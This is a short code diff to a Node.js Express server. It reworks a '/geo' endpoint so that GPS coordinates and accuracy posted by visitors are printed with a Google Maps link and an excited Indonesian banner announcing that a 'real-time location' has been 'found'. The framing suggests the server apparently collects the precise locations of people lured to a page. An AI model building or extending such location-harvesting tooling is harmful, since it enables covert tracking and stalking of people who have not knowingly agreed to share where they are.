@@ -54,7 +54,20 @@ ${mapsUrl}
 
 // Endpoint geolocation
 app.post('/geo', (req, res) => {
-    console.log('📍 GEO:', req.body);
+    const { lat, lon, accuracy } = req.body;
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+    console.log(`
+�🚨 LOKASI REAL-TIME (GPS) DITEMUKAN! 🚨🚨
+---------------------------------------------------------------
+🎯 AKURASI  : ${accuracy} meter
+📍 KOORDINAT: ${lat}, ${lon}
+
+👇 KLIK LINK INI (SANGAT AKURAT) 👇
+${mapsUrl}
+---------------------------------------------------------------
+    `);
+
     res.json({ status: 'ok' });
 });
 
